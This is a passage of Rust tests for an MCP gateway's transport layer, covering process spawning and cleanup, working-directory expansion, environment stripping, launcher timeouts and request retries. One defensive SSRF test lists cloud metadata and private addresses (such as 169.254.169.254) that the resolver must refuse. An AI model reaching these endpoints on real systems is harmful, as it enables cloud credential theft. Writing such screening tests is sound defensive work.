        // The body goes in a file rather than `sh -c` because the spawn guard
        // (correctly) refuses inline-eval flags.
        let script_file = pid_file.with_extension("sh");
        std::fs::write(
            &script_file,
            format!("sleep 60 &\necho $! > '{}'\nwait\n", pid_file.to_string_lossy()),
        )
        .expect("write launcher script");
        let args = vec![script_file.to_string_lossy().into_owned()];
        let transport =
            StdioTransport::spawn("sh", &args, &[], None).expect("spawn launcher shell");

        // Poll for parsable CONTENT, not mere existence: the shell's redirection
        // creates the file before `echo` writes to it, so a read in between
        // returns empty and would make this test flake.
        let created_deadline = Instant::now() + Duration::from_secs(8);
        let grandchild_pid: i32 = loop {
            if let Some(pid) = std::fs::read_to_string(&pid_file)
                .ok()
                .and_then(|s| s.trim().parse::<i32>().ok())
            {
                break pid;
            }
            assert!(
                Instant::now() < created_deadline,
                "launcher should record its grandchild pid"
            );
            std::thread::sleep(Duration::from_millis(25));
        };
        assert!(
            process_is_running(grandchild_pid),
            "grandchild must be alive before the transport is dropped"
        );

        drop(transport);
        let exit_deadline = Instant::now() + Duration::from_secs(5);
        while process_is_running(grandchild_pid) && Instant::now() < exit_deadline {
            std::thread::sleep(Duration::from_millis(25));
        }
        assert!(
            !process_is_running(grandchild_pid),
            "dropping the transport must kill launcher descendants, not just the launcher"
        );
        let _ = std::fs::remove_file(pid_file);
        let _ = std::fs::remove_file(script_file);
    }

    #[test]
    fn expand_cwd_handles_tilde_and_env() {
        use std::path::PathBuf;
        // A unique var name so the process-wide set_var can't collide with a
        // parallel test.
        let var = format!("TP_TEST_CWD_{}", std::process::id());
        std::env::set_var(&var, "abc");
        assert_eq!(expand_cwd(&format!("/x/${{{var}}}/y")), PathBuf::from("/x/abc/y"));
        std::env::remove_var(&var);
        // An unset var expands to empty; a literal path is unchanged.
        assert_eq!(expand_cwd("/x/${TP_UNSET_ZZZ}/y"), PathBuf::from("/x//y"));
        assert_eq!(expand_cwd("/plain/path"), PathBuf::from("/plain/path"));
        // A leading `~` becomes the home dir.
        if let Some(home) = dirs::home_dir() {
            assert_eq!(expand_cwd("~"), home);
            assert_eq!(expand_cwd("~/proj"), home.join("proj"));
        }
    }

    #[test]
    fn cwd_validation_error_names_config_expansion_and_empty_variables() {
        let error = cwd_validation_error(
            "${MISSING}/project",
            Path::new("/project"),
            &["MISSING".to_string()],
        );

        assert!(error.contains(r#"configured working directory "${MISSING}/project""#));
        assert!(error.contains(r#"expanded to "/project""#));
        assert!(error.contains("expanded empty environment variables: ${MISSING}"));
    }

    #[test]
    fn validate_cwd_accepts_an_existing_directory() {
        let dir = std::env::temp_dir().join(format!("toolport-cwd-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        assert_eq!(validate_cwd(dir.to_str().unwrap()).unwrap(), dir);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    /// The two tests above cover the message shape and the happy path, and both
    /// still pass if `validate_cwd` is reduced to `Ok(expand_cwd(dir))`. These
    /// two pin the behaviour the change actually adds, so a later refactor can't
    /// drop the check and stay green.
    #[test]
    fn validate_cwd_rejects_a_missing_directory() {
        let missing = std::env::temp_dir()
            .join(format!("toolport-cwd-absent-{}", std::process::id()))
            .join("nope");
        let error = validate_cwd(missing.to_str().unwrap()).unwrap_err();
        assert!(error.contains("does not exist"), "got: {error}");
        // The message formats paths with `{:?}`, which escapes separators on
        // Windows, so compare against the debug form rather than the raw path.
        assert!(
            error.contains(&format!("{missing:?}")),
            "the error must name the expanded path; got: {error}"
        );
    }

    #[test]
    fn empty_cwd_variables_reports_only_unset_names() {
        let set = format!("TP_TEST_CWD_SET_{}", std::process::id());
        let unset = format!("TP_TEST_CWD_UNSET_{}", std::process::id());
        std::env::set_var(&set, "value");
        std::env::remove_var(&unset);

        // An unset var is reported, a set one is not.
        assert_eq!(
            empty_cwd_variables(&format!("${{{unset}}}/project")),
            vec![unset.clone()]
        );
        assert!(empty_cwd_variables(&format!("${{{set}}}/project")).is_empty());
        // ROOT is resolved upstream by resolve_root_token, so it is never a
        // "you forgot to set this" hint.
        assert!(empty_cwd_variables("${ROOT}/project").is_empty());
        // A var set to the empty string counts as empty.
        std::env::set_var(&unset, "");
        assert_eq!(
            empty_cwd_variables(&format!("${{{unset}}}/p")),
            vec![unset.clone()]
        );

        std::env::remove_var(&set);
        std::env::remove_var(&unset);
    }

    #[test]
    fn strips_gateway_control_env_from_children() {
        use std::collections::HashSet;
        use std::ffi::OsStr;
        // pid-unique names so a parallel test's process-wide env set can't collide.
        let secret = format!("CONDUIT_TEST_SECRET_{}", std::process::id());
        let secret_new = format!("TOOLPORT_TEST_SECRET_{}", std::process::id());
        let keep = format!("TP_KEEP_{}", std::process::id());
        std::env::set_var(&secret, "leak-me");
        std::env::set_var(&secret_new, "leak-me-too");
        std::env::set_var(&keep, "ok");

        // Nothing configured: inherited TOOLPORT_*/CONDUIT_* vars are marked for
        // removal from the child (get_envs records a removal as value None), and an
        // unrelated var is left untouched.
        let empty: HashSet<&str> = HashSet::new();
        let mut cmd = std::process::Command::new("true");
        super::strip_gateway_control_env(&mut cmd, &empty);
        let overrides: Vec<_> = cmd.get_envs().collect();
        assert!(
            overrides.iter().any(|(k, v)| *k == OsStr::new(&secret) && v.is_none()),
            "a CONDUIT_* var must be stripped from the child"
        );
        assert!(
            overrides
                .iter()
                .any(|(k, v)| *k == OsStr::new(&secret_new) && v.is_none()),
            "a TOOLPORT_* var must be stripped from the child"
        );
        assert!(
            !overrides.iter().any(|(k, _)| *k == OsStr::new(&keep)),
            "an unrelated var must not be touched by the strip"
        );

        // A server that sets a control-plane-prefixed var for itself keeps it.
        let configured: HashSet<&str> = [secret.as_str(), secret_new.as_str()].into_iter().collect();
        let mut cmd2 = std::process::Command::new("true");
        super::strip_gateway_control_env(&mut cmd2, &configured);
        assert!(
            !cmd2.get_envs().any(|(k, _)| k == OsStr::new(&secret)),
            "a server-configured CONDUIT_ var must be exempt from the strip"
        );
        assert!(
            !cmd2.get_envs().any(|(k, _)| k == OsStr::new(&secret_new)),
            "a server-configured TOOLPORT_ var must be exempt from the strip"
        );

        std::env::remove_var(&secret);
        std::env::remove_var(&secret_new);
        std::env::remove_var(&keep);
    }

    /// The connect budget must be decided by the CONFIGURED command, never by the
    /// launcher rewrite's output.
    ///
    /// `spawn_inner` keeps the rewrite in separate `spawn_command`/`spawn_args`
    /// bindings and classifies the configured pair before it. Reading
    /// `is_download_launcher` off the rewritten pair instead would see
    /// `node <abs script>` rather than `npx -y pkg`. The two disagree, which is the
    /// hazard: a server whose rewrite succeeded would silently drop from the 120s
    /// launcher budget to the 10s one, while `stdio_connect_timeout` kept reporting
    /// 120s for the same server at other call sites.
    #[test]
    fn a_rewritten_command_must_not_decide_the_connect_budget() {
        let a = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        let configured = ("npx", a(&["-y", "toolport-mcp-servers", "vercel"]));
        // What resolve_direct turns the above into.
        let rewritten = (
            r"C:\Program Files\nodejs\node.exe",
            a(&[r"C:\cache\_npx\h\node_modules\toolport-mcp-servers\bin\cli.js", "vercel"]),
        );

        assert!(
            super::is_download_launcher(configured.0, &configured.1),
            "the configured invocation is a download launcher"
        );
        assert!(
            !super::is_download_launcher(rewritten.0, &rewritten.1),
            "the rewritten invocation is not, which is why the classification has to \
             be captured before the rewrite shadows the original"
        );
        assert_eq!(
            super::stdio_connect_timeout(configured.0, &configured.1),
            super::LAUNCHER_CONNECT_TIMEOUT,
            "callers still compute the long budget from the configured command, so \
             the transport must agree with them"
        );
    }

    /// The capture point itself, driven through `spawn_inner` with a rewrite that
    /// actually succeeds.
    ///
    /// The assertion above proves the two classifications differ; it does not prove
    /// `spawn_inner` reads the configured one, and moving the capture back after the
    /// rewrite leaves it green. Verified by exactly that mutation. Needs the rewrite
    /// to succeed to discriminate at all: on a fallback both pairs are the same
    /// command, so the wrong capture point still yields the right answer.
    #[test]
    fn spawn_inner_takes_the_connect_budget_from_the_configured_command() {
        let tag = format!("toolport-spawnfix-{}", std::process::id());
        let root = std::env::temp_dir().join(&tag);
        let _ = std::fs::remove_dir_all(&root);

        // A fixture npx cache holding one package whose entry just holds stdin open,
        // so the spawned child survives long enough to inspect the transport.
        let pkg = root.join("_npx").join("hash").join("node_modules").join("srv");
        std::fs::create_dir_all(pkg.join("bin")).expect("fixture package");
        std::fs::write(
            pkg.join("package.json"),
            r#"{"name":"srv","version":"1.0.0","bin":{"srv":"bin/cli.js"}}"#,
        )
        .expect("manifest");
        std::fs::write(pkg.join("bin").join("cli.js"), "process.stdin.resume();\n")
            .expect("stub entry");
        std::env::set_var("npm_config_cache", &root);

        // Unique args so the process-wide resolution memo cannot serve a stale miss.
        let args: Vec<String> = ["-y", "srv", &tag].iter().map(|s| s.to_string()).collect();
        let resolved = crate::launcher::resolve_direct("npx", &args);
        std::env::remove_var("npm_config_cache");

        // If node is missing the rewrite cannot happen and the test would assert
        // nothing, so say so rather than passing vacuously.
        let Some(direct) = resolved else {
            let _ = std::fs::remove_dir_all(&root);
            panic!("fixture package must resolve, or this test discriminates nothing");
        };
        assert!(
            !super::is_download_launcher(&direct.command, &direct.args),
            "the rewritten pair must classify as a non-launcher for this to bite"
        );

        std::env::set_var("npm_config_cache", &root);
        let transport = super::StdioTransport::spawn_inner("npx", &args, &[], None, None, None);
        std::env::remove_var("npm_config_cache");
        let transport = transport.expect("the stub server must spawn");

        assert!(
            transport.launcher,
            "the connect budget must come from the configured `npx`, not the `node` \
             the rewrite produced"
        );
        assert_eq!(
            transport.connect_timeout(),
            super::LAUNCHER_CONNECT_TIMEOUT,
            "and it must reach connect_timeout as the long budget"
        );

        drop(transport);
        let _ = std::fs::remove_dir_all(&root);
    }

    /// Prepending a launcher's `node_modules/.bin` must not also decide whether a
    /// server's configured PATH wins.
    ///
    /// The two platforms already disagree: Windows lets a configured PATH through
    /// via `.envs()`, while `spawn_inner` overwrites PATH with `augmented_path()`
    /// unconditionally on everything else. An earlier version of the rewrite always
    /// preferred the configured PATH, so on non-Windows a server that set PATH
    /// silently lost the augmented nvm/asdf/homebrew entries - but only when the
    /// rewrite happened to succeed, which is the worst kind of conditional.
    #[test]
    fn a_launcher_rewrite_does_not_change_which_path_wins() {
        let configured = vec![("PATH".to_string(), "/configured/only".to_string())];
        let base = super::base_child_path(&configured);
        // `augmented_path` only exists off Windows, so this splits at compile time
        // rather than with a runtime `cfg!`.
        #[cfg(windows)]
        assert_eq!(
            base, "/configured/only",
            "Windows passes a configured PATH to the child, so it is the base"
        );
        #[cfg(not(windows))]
        assert_eq!(
            base,
            super::augmented_path(),
            "non-Windows overwrites PATH regardless, so the rewrite must build on that"
        );
        // With nothing configured, both platforms land on the same PATH the child
        // would have received with no rewrite at all.
        assert!(!super::base_child_path(&[]).is_empty());
    }

    /// Verify that a downstream server spawned with process-group isolation lands
    /// in its own process group, not the gateway's (test process's) group. This is
    /// the invariant that prevents terminal job-control signals from a child
    /// propagating to the AI client that spawned the gateway.
    #[cfg(unix)]
    #[test]
    fn process_group_isolation_puts_child_in_separate_group() {
        use std::os::unix::process::CommandExt as _;

        // Our own process group id.
        let our_pgid = unsafe { libc_getpgrp() };

        // Build a Command with the same isolation applied to downstream spawns.
        // Use a longer sleep so the child reliably stays alive during the getpgid
        // check, then kill it immediately to avoid delaying the test suite.
        let mut cmd = std::process::Command::new("sleep");
        cmd.arg("10");
        super::apply_process_group_isolation(&mut cmd);

        // Spawn and read the child's actual pgid via getpgid(child_pid).
        let mut child = cmd.spawn().expect("spawn sleep");
        let child_pid = child.id() as i32;
        let child_pgid = unsafe { libc_getpgid(child_pid) };

        // The child must NOT be in our process group.
        assert_ne!(
            child_pgid, our_pgid,
            "downstream child must be in its own process group, not the parent's"
        );
        // process_group(0) sets the child's pgid to its own pid.
        assert_eq!(
            child_pgid, child_pid,
            "process_group(0) should set pgid = child pid"
        );

        // Clean up: kill the child to exit early, then wait to prevent a zombie.
        let _ = child.kill();
        let _ = child.wait();
    }

    #[test]
    fn resolve_root_token_substitutes_and_falls_back() {
        // Blank -> None (inherit the gateway cwd).
        assert_eq!(resolve_root_token("", Some("/proj")), None);
        assert_eq!(resolve_root_token("   ", Some("/proj")), None);
        // ${ROOT} with a known root -> substituted.
        assert_eq!(resolve_root_token("${ROOT}", Some("/home/u/proj")), Some("/home/u/proj".into()));
        assert_eq!(
            resolve_root_token("${ROOT}/sub", Some("/home/u/proj")),
            Some("/home/u/proj/sub".into())
        );
        // ${ROOT} with no known root -> None (fall back, never a literal ${ROOT}).
        assert_eq!(resolve_root_token("${ROOT}/sub", None), None);
        // No ${ROOT} -> the trimmed config, regardless of root.
        assert_eq!(resolve_root_token("/plain", None), Some("/plain".into()));
        assert_eq!(resolve_root_token("  /plain  ", Some("/proj")), Some("/plain".into()));
        // Composes with expand_cwd: an un-touched ${VAR} survives for expand_cwd.
        assert_eq!(resolve_root_token("${ROOT}/${SUB}", Some("/proj")), Some("/proj/${SUB}".into()));
    }

    #[test]
    fn file_uri_to_path_decodes_platform_paths() {
        use std::path::PathBuf;
        // Non-file / unparseable -> None.
        assert_eq!(file_uri_to_path("https://example.com/x"), None);
        assert_eq!(file_uri_to_path("not a uri"), None);
        // Compare as PathBuf so `/` vs `\` separators don't make the test brittle.
        let as_path = |u: &str| file_uri_to_path(u).map(PathBuf::from);
        #[cfg(not(windows))]
        {
            assert_eq!(as_path("file:///home/u/proj"), Some(PathBuf::from("/home/u/proj")));
            assert_eq!(as_path("file:///home/u/my%20proj"), Some(PathBuf::from("/home/u/my proj")));
        }
        #[cfg(windows)]
        {
            assert_eq!(as_path("file:///C:/Users/u/proj"), Some(PathBuf::from(r"C:\Users\u\proj")));
            assert_eq!(
                as_path("file:///C:/Users/u/my%20proj"),
                Some(PathBuf::from(r"C:\Users\u\my proj"))
            );
        }
    }

    #[test]
    fn download_launchers_get_the_long_connect_budget() {
        use super::{stdio_connect_timeout, LAUNCHER_CONNECT_TIMEOUT};
        let a = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        // Bare launchers, wherever they live and however Windows shims them.
        for cmd in [
            "npx",
            "uvx",
            "bunx",
            "/usr/local/bin/npx",
            r"C:\Program Files\nodejs\npx.cmd",
            "NPX.EXE",
            "uvx.exe",
        ] {
            assert_eq!(
                stdio_connect_timeout(cmd, &a(&["-y", "@scope/pkg"])),
                LAUNCHER_CONNECT_TIMEOUT,
                "{cmd} should get the launcher budget"
            );
        }
        // Package managers count only in their download-then-run form.
        for (cmd, args) in [
            ("pnpm", vec!["dlx", "some-mcp"]),
            ("yarn", vec!["dlx", "some-mcp"]),
            ("npm", vec!["exec", "some-mcp"]),
            ("npm", vec!["x", "some-mcp"]),
            ("pipx", vec!["run", "some-mcp"]),
        ] {
            assert_eq!(
                stdio_connect_timeout(cmd, &a(&args)),
                LAUNCHER_CONNECT_TIMEOUT,
                "{cmd} {args:?} should get the launcher budget"
            );
        }
        // A config that packed the whole invocation into `command` is normalized
        // the same way the spawn path does before matching.
        assert_eq!(
            stdio_connect_timeout("npx -y @scope/pkg", &[]),
            LAUNCHER_CONNECT_TIMEOUT
        );
    }

    #[test]
    fn ordinary_commands_keep_the_tight_connect_budget() {
        use super::{stdio_connect_timeout, STDIO_CONNECT_TIMEOUT};
        let a = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        for (cmd, args) in [
            // Already-installed runtimes: nothing to download, fail fast.
            ("node", vec!["server.js"]),
            ("python", vec!["-m", "some_mcp"]),
            ("docker", vec!["run", "npx"]), // launcher name in args is not a launcher
            (r"C:\tools\my-server.exe", vec![]),
            // Package managers running an existing project, not fetching one.
            ("pnpm", vec!["run", "start"]),
            ("yarn", vec!["start"]),
            ("npm", vec!["start"]),
            ("pipx", vec![]),
            // A path that merely contains a launcher-ish segment.
            ("/opt/npx-tools/server", vec![]),
        ] {
            assert_eq!(
                stdio_connect_timeout(cmd, &a(&args)),
                STDIO_CONNECT_TIMEOUT,
                "{cmd} {args:?} should keep the tight budget"
            );
        }
    }

    #[test]
    fn is_server_initiated_request_detects_downstream_rpc() {
        let req = json!({"jsonrpc":"2.0","id":1,"method":"roots/list"});
        assert!(super::is_server_initiated_request(&req));
        let resp = json!({"jsonrpc":"2.0","id":1,"result":{"roots":[]}});
        assert!(!super::is_server_initiated_request(&resp));
        let note = json!({"jsonrpc":"2.0","method":"notifications/tools/list_changed"});
        assert!(!super::is_server_initiated_request(&note));
    }

    #[test]
    fn legacy_client_auto_fulfills_modern_input_required() {
        let (transport, requests) = MrtrTransport::modern(vec![
            Ok(json!({
                "resultType": "input_required",
                "inputRequests": {
                    "confirm": {
                        "method": "elicitation/create",
                        "params": {
                            "message": "Continue?",
                            "requestedSchema": { "type": "object" }
                        }
                    },
                    "workspace": { "method": "roots/list" }
                },
                "requestState": "opaque-state"
            })),
            Ok(json!({
                "resultType": "complete",
                "content": [{ "type": "text", "text": "done" }]
            })),
        ]);
        let mut server = DownstreamServer::connect("modern".into(), Box::new(transport)).unwrap();
        let handler: ServerRequestHandler = Arc::new(|request| {
            let id = request["id"].clone();
            match request["method"].as_str() {
                Some("elicitation/create") => Some(ServerRequestAction::Respond(json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": { "action": "accept", "content": { "approved": true } }
                }))),
                Some("roots/list") => Some(ServerRequestAction::Respond(json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "result": { "roots": [{ "uri": "file:///workspace" }] }
                }))),
                _ => None,
            }
        });
        server.set_server_request_handler(handler);

        let result = server.call("echo", json!({ "text": "hi" })).unwrap();
        assert_eq!(result["resultType"], "complete");

        let requests = requests.lock().unwrap();
        let calls: Vec<&Value> = requests
            .iter()
            .filter(|(method, _)| method == "tools/call")
            .map(|(_, params)| params)
            .collect();
        assert_eq!(calls.len(), 2, "the retry is a new downstream request");
        assert!(calls[0].get("inputResponses").is_none());
        assert!(calls[0].get("requestState").is_none());
        assert_eq!(calls[1]["requestState"], "opaque-state");
        assert_eq!(calls[1]["inputResponses"]["confirm"]["action"], "accept");
        assert_eq!(
            calls[1]["inputResponses"]["workspace"]["roots"][0]["uri"],
            "file:///workspace"
        );
    }

    #[test]
    fn mrtr_null_retry_fields_are_treated_as_absent() {
        let retry = MrtrRequest::from_params(Some(&json!({
            "inputResponses": null,
            "requestState": null
        })));

        assert!(retry.is_empty());
        let mut params = json!({ "name": "echo", "arguments": {} });
        retry.apply(&mut params);
        assert!(params.get("inputResponses").is_none());
        assert!(params.get("requestState").is_none());
    }

    #[test]
    fn modern_client_receives_input_required_and_controls_the_retry() {
        use std::sync::atomic::{AtomicUsize, Ordering};

        let (transport, requests) = MrtrTransport::modern(vec![
            Ok(json!({
                "resultType": "input_required",
                "inputRequests": {
                    "confirm": {
                        "method": "elicitation/create",
                        "params": { "message": "Continue?" }
                    }
                },
                "requestState": "byte-exact-state"
            })),
            Ok(json!({ "resultType": "complete", "content": [] })),
        ]);
        let mut server = DownstreamServer::connect("modern".into(), Box::new(transport)).unwrap();
        let handled = Arc::new(AtomicUsize::new(0));
        let handled_by_bridge = Arc::clone(&handled);
        server.set_server_request_handler(Arc::new(move |_| {
            handled_by_bridge.fetch_add(1, Ordering::SeqCst);
            None
        }));
        let meta = json!({
            "io.modelcontextprotocol/protocolVersion": MODERN_PROTOCOL_VERSION
        });

        let incomplete = server
            .call_with_cancel_and_mrtr("echo", json!({}), None, Some(&meta), None)
            .unwrap();
        assert_eq!(incomplete["resultType"], "input_required");
        assert_eq!(handled.load(Ordering::SeqCst), 0, "native MRTR is not shimmed");

        let retry = MrtrRequest {
            input_responses: Some(json!({
                "confirm": { "action": "accept", "content": { "approved": true } }
            })),
            request_state: Some(json!("byte-exact-state")),
        };
        let complete = server
            .call_with_cancel_and_mrtr("echo", json!({}), None, Some(&meta), Some(&retry))
            .unwrap();
        assert_eq!(complete["resultType"], "complete");

        let requests = requests.lock().unwrap();
        let calls: Vec<&Value> = requests
            .iter()
            .filter(|(method, _)| method == "tools/call")
            .map(|(_, params)| params)
            .collect();
        assert_eq!(calls.len(), 2);
        assert_eq!(calls[1]["requestState"], "byte-exact-state");
        assert_eq!(calls[1]["inputResponses"], retry.input_responses.unwrap());
    }

    #[test]
    fn http_sse_answers_inline_server_request_before_final_response() {
        use super::{
            HttpTransport, RefreshFn, ServerRequestAction, ServerRequestHandler, Transport,
        };
        use serde_json::Value;
        use std::io::{Read, Write};
        use std::net::TcpListener;
        use std::sync::atomic::{AtomicUsize, Ordering};
        use std::sync::Arc;

        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(false).unwrap();
        let port = listener.local_addr().unwrap().port();
        let server_handle = std::thread::spawn(move || {
            let mut sse = listener.accept().unwrap().0;
            let headers = read_http_headers(&mut sse);
            if headers
                .windows(b"expect: 100-continue".len())
                .any(|w| w.eq_ignore_ascii_case(b"expect: 100-continue"))
            {
                sse.write_all(b"HTTP/1.1 100 Continue\r\n\r\n").unwrap();
            }
            if let Some(len) = content_length(&headers) {
                let mut body = vec![0u8; len];
                sse.read_exact(&mut body).unwrap();
            }

            let line1 = "data: {\"jsonrpc\":\"2.0\",\"id\":99,\"method\":\"roots/list\"}\n";
            sse.write_all(
                b"HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n",
            )
            .unwrap();
            write_chunk(&mut sse, line1.as_bytes());

            let mut inline = listener.accept().unwrap().0;
            let inline_headers = read_http_headers(&mut inline);
            assert!(String::from_utf8_lossy(&inline_headers)
                .to_ascii_lowercase()
                .contains("authorization: bearer fresh"));
            let mut body = String::new();
            if let Some(len) = content_length(&inline_headers) {
                let mut raw = vec![0u8; len];
                inline.read_exact(&mut raw).unwrap();
                body = String::from_utf8_lossy(&raw).into_owned();
            }
            assert!(body.contains("\"id\":99"));
            inline
                .write_all(b"HTTP/1.1 202 Accepted\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}")
                .unwrap();

            let line2 = "data: {\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"ok\":true}}\n";
            write_chunk(&mut sse, line2.as_bytes());
            sse.write_all(b"0\r\n\r\n").unwrap();
        });


        fn read_http_headers(r: &mut impl Read) -> Vec<u8> {
            let mut req_buf = Vec::new();
            let mut byte = [0u8; 1];
            while r.read(&mut byte).unwrap() > 0 {
                req_buf.push(byte[0]);
                if req_buf.len() >= 4 && &req_buf[req_buf.len() - 4..] == b"\r\n\r\n" {
                    break;
                }
            }
            req_buf
        }

        fn content_length(headers: &[u8]) -> Option<usize> {
            let headers = String::from_utf8_lossy(headers);
            for line in headers.lines() {
                if let Some(v) = line.strip_prefix("Content-Length:").or_else(|| line.strip_prefix("content-length:")) {
                    return v.trim().parse().ok();
                }
            }
            None
        }

        fn write_chunk(w: &mut impl Write, data: &[u8]) {
            write!(w, "{:x}\r\n", data.len()).unwrap();
            w.write_all(data).unwrap();
            w.write_all(b"\r\n").unwrap();
            w.flush().unwrap();
        }

        let handler: ServerRequestHandler = Arc::new(|req| {
            if req.get("method").and_then(|m| m.as_str()) == Some("roots/list") {
                Some(ServerRequestAction::Respond(json!({
                    "jsonrpc": "2.0",
                    "id": req.get("id").cloned().unwrap_or(Value::Null),
                    "result": { "roots": [] }
                })))
            } else {
                None
            }
        });
        let url = format!("http://127.0.0.1:{port}/");
        let refresh_calls = Arc::new(AtomicUsize::new(0));
        let calls = Arc::clone(&refresh_calls);
        let refresh: Option<RefreshFn> = Some(Box::new(move |force| {
            assert!(!force);
            if calls.fetch_add(1, Ordering::SeqCst) == 1 {
                Ok(Some("fresh".to_string()))
            } else {
                Ok(None)
            }
        }));
        let mut t =
            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
        t.set_server_request_handler(handler);
        let result = t
            .post(
                &json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call" }),
                true,
            )
            .expect("inline reply should unblock the SSE stream");
        server_handle.join().unwrap();
        assert_eq!(refresh_calls.load(Ordering::SeqCst), 2);
        assert_eq!(
            result
                .and_then(|v| v.get("result").cloned())
                .unwrap_or(Value::Null),
            json!({"ok": true})
        );
    }

    #[test]
    fn http_sse_mrtr_resumes_without_reposting_the_original_request() {
        use super::{HttpTransport, ServerRequestAction, Transport};
        use std::io::{Read, Write};
        use std::net::TcpListener;
        use std::sync::Arc;

        fn read_http_request(stream: &mut impl Read) -> String {
            let mut headers = Vec::new();
            let mut byte = [0u8; 1];
            while stream.read(&mut byte).unwrap() > 0 {
                headers.push(byte[0]);
                if headers.ends_with(b"\r\n\r\n") {
                    break;
                }
            }
            let text = String::from_utf8_lossy(&headers);
            let len = text
                .lines()
                .find_map(|line| {
                    line.strip_prefix("Content-Length:")
                        .or_else(|| line.strip_prefix("content-length:"))
                })
                .and_then(|value| value.trim().parse::<usize>().ok())
                .unwrap_or(0);
            let mut body = vec![0u8; len];
            stream.read_exact(&mut body).unwrap();
            String::from_utf8(body).unwrap()
        }

        fn write_chunk(stream: &mut impl Write, data: &str) {
            write!(stream, "{:x}\r\n{data}\r\n", data.len()).unwrap();
            stream.flush().unwrap();
        }

        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let server = std::thread::spawn(move || {
            let mut original = listener.accept().unwrap().0;
            let original_body = read_http_request(&mut original);
            assert!(original_body.contains("\"method\":\"tools/call\""));
            original
                .write_all(
                    b"HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n",
                )
                .unwrap();
            write_chunk(
                &mut original,
                "data: {\"jsonrpc\":\"2.0\",\"id\":99,\"method\":\"elicitation/create\",\"params\":{\"message\":\"Continue?\"}}\n",
            );

            let mut response = listener.accept().unwrap().0;
            let response_body = read_http_request(&mut response);
            assert!(response_body.contains("\"id\":99"));
            assert!(response_body.contains("\"action\":\"accept\""));
            response
                .write_all(
                    b"HTTP/1.1 202 Accepted\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}",
                )
                .unwrap();

            write_chunk(
                &mut original,
                "data: {\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"ok\":true}}\n",
            );
            original.write_all(b"0\r\n\r\n").unwrap();
        });

        let mut transport = HttpTransport::new(&format!("http://127.0.0.1:{port}/"));
        transport.set_server_request_handler(Arc::new(|request| {
            (request["method"] == "elicitation/create")
                .then_some(ServerRequestAction::InputRequired)
        }));
        let first = transport
            .request("tools/call", json!({ "name": "interactive", "arguments": {} }))
            .expect("first round");
        assert_eq!(first["resultType"], "input_required");
        let state = first["requestState"].clone();
        let requests = first["inputRequests"].as_object().unwrap();
        let key = requests.keys().next().unwrap().clone();

        let final_result = transport
            .request(
                "tools/call",
                json!({
                    "name": "interactive",
                    "arguments": {},
                    "requestState": state,
                    "inputResponses": {
                        key: { "action": "accept", "content": { "approved": true } }
                    }
                }),
            )
            .expect("resumed round");
        assert_eq!(final_result, json!({ "ok": true }));
        server.join().unwrap();
    }


    #[test]
    fn ssrf_resolver_screens_resolved_addresses() {
        use std::net::SocketAddr;
        let p = |s: &str| s.parse::<SocketAddr>().unwrap();
        let metadata = p("169.254.169.254:80"); // AWS/GCP/Azure v4 metadata
        let aws_v6 = p("[fd00:ec2::254]:80"); // AWS v6 metadata (ULA)
        let mapped_v6 = p("[::ffff:169.254.169.254]:80"); // IPv4-mapped metadata
        let private = p("10.0.0.1:80");
        let loopback = p("127.0.0.1:80");
        let public = p("8.8.8.8:443");

        // Link-local / cloud-metadata is refused regardless of block_private.
        for a in [metadata, aws_v6, mapped_v6] {
            assert!(screen_resolved_addrs(&[a], false).is_err());
            assert!(screen_resolved_addrs(&[a], true).is_err());
        }
        // Private/loopback: allowed for trusted servers, refused for untrusted ones.
        for a in [private, loopback] {
            assert!(screen_resolved_addrs(&[a], false).is_ok());
            assert!(screen_resolved_addrs(&[a], true).is_err());
        }
        // A public address is always allowed.
        assert!(screen_resolved_addrs(&[public], false).is_ok());
        assert!(screen_resolved_addrs(&[public], true).is_ok());
        // Fail-closed: a rebind answer mixing public + metadata is refused whole, so
        // the internal IP can't be reached even alongside a benign one.
        assert!(screen_resolved_addrs(&[public, metadata], false).is_err());
        assert!(screen_resolved_addrs(&[public, metadata], true).is_err());
    }

    #[test]
    fn paths_with_extension_pass_through() {
        assert_eq!(resolve_command("C:\\tools\\foo.exe"), "C:\\tools\\foo.exe");
    }

    #[test]
    fn cancel_registry_tracks_active_requests() {
        let registry = CancelRegistry::new();
        assert!(!registry.cancel("7", Some("too slow")));

        assert!(registry.begin_client_request("7".to_string()));
        assert!(registry.cancel("7", Some("too slow")));
        assert!(registry.is_cancelled("7"));

        registry.finish_client_request("7");
        assert!(!registry.is_cancelled("7"));
        assert!(!registry.cancel("7", None));
    }

    #[test]
    fn cancel_registry_rejects_duplicate_active_ids() {
        let registry = CancelRegistry::new();
        assert!(registry.begin_client_request("7".to_string()));
        assert!(!registry.begin_client_request("7".to_string()));

        registry.finish_client_request("7");
        assert!(registry.begin_client_request("7".to_string()));
    }

    #[test]
    fn cancel_registry_persists_reason_for_deferred_forward() {
        let registry = CancelRegistry::new();
        assert!(registry.begin_client_request("7".to_string()));
        assert!(registry.cancel("7", Some("too slow")));

        let state = registry
            .inner
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let cancelled = state.cancelled.get("7").expect("cancelled state");
        assert_eq!(cancelled.reason.as_deref(), Some("too slow"));
        assert!(!cancelled.forwarded);
    }

    fn argv(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn spawn_guard_allows_normal_mcp_launchers() {
        // The overwhelmingly common launchers must never be blocked.
